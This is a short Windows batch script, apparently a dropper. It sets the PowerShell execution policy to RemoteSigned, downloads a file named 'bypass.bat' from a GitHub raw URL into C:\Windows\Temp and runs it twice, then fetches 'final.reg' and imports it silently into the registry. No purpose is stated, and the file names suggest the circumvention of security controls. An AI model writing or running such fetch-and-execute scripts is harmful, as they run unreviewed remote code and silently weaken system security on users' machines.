@echo off
powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/bypass.bat -O C:\Windows\Temp\bypass.bat"
cmd /c "C:\Windows\Temp\bypass.bat"
cmd /c "C:\Windows\Temp\bypass.bat"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/final.reg -O C:\Windows\Temp\final.reg"
regedit /s "\Windows\Temp\final.reg"
